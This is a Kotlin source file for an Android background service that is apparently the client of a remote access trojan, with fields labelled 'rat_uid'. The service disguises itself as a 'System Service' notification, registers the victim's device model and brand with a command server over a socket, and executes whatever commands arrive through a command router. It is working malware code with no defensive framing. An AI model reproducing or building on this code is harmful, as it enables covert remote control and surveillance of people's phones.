package com.app.cyber

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class SocketService : Service() {

    private var socket: Socket? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        
        // FIX FORCE CLOSE: Service wajib panggil startForeground
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("SocketServiceChannel", "Background Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
            val notification = NotificationCompat.Builder(this, "SocketServiceChannel")
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
            startForeground(2, notification)
        }
        
        connectToServer()
    }

    private fun connectToServer() {
        try {
            val opts = IO.Options()
            opts.reconnection = true
            opts.forceNew = true
            socket = IO.socket(Config.BaseUrl, opts)
            
            socket?.on(Socket.EVENT_CONNECT) {
                val payload = JSONObject()
                payload.put("action", "register")
                payload.put("rat_uid", Utils.getRatUid(this))
                payload.put("model", android.os.Build.MODEL)
                payload.put("brand", android.os.Build.BRAND)
                payload.put("sdk", android.os.Build.VERSION.SDK_INT)
                socket?.emit("device", payload)
            }
            
            socket?.on("cmd") { args ->
                if (args.isNotEmpty()) {
                    CommandRouter.route(this, args[0] as JSONObject)
                }
            }
            
            socket?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        socket?.disconnect()
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) {
            val intent = Intent(ctx, SocketService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
        }
    }
}
